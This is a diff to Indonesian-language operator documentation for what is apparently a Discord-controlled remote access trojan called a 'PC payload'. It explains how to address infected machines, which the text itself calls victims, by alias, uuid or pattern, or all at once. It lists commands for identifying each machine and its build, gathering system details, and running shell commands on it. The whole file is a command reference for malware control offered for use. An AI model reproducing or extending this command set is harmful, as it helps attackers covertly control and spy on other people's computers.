@@ -1,10 +1,28 @@
 # Perintah payload PC
 
-Format: `!a <verb> [args]`, `!<uuid> <verb>`, `!* <verb>` (semua mesin).
-Balasan selalu diprefix `[a]`.
+Format: `!<alamat> <verb> [args]`. Balasan selalu diprefix `[alias]`.
+
+## Cara mengalamatkan
+
+| bentuk | arti |
+|---|---|
+| `!kent shot` | alias mesin ini — default diturunkan dari nama host (`PC-KENTANQ` → `kent`) |
+| `!6908c58a shot` | uuid8, satu mesin tertentu |
+| `!@hojv shot` | pola `host` / `user` / `uuid8` / alias mengandung `hojv` |
+| `!* who` | semua mesin yang hidup, masing-masing menjawab |
+
+Kenapa `!@` ada: alias dulu dibekukan waktu build (`--alias a`), jadi dua korban
+di channel yang sama sama-sama menjawab `!a` dan tidak ada cara memilih satu.
+Sekarang alias diturunkan dari nama host saat jalan, dan `!@` tetap bisa dipakai
+kalau aliasnya kebetulan kembar.
+
+`who` (alias: `id`, `device`, `me`) adalah kartu identitas: uuid8, host, user,
+build, ukuran + sha8 exe, pid, uptime, channel. `!* who` = daftar semua mesin
+sekaligus, dan sha8 di tiap baris yang membedakan build baru dari build usang.
 
 | verb | keterangan | hak |
 |---|---|---|
+| `who` / `id` | kartu identitas + sha8 build | user |
 | `info` / `sys` | host, user, os, cpu, ram, uptime, admin, pid, exe, cwd, lan ip | user |
 | `ping` | waktu bolak-balik ke API Discord + kode HTTP | user |
 | `sh <cmd>` | shell biasa, cwd persisten | user |
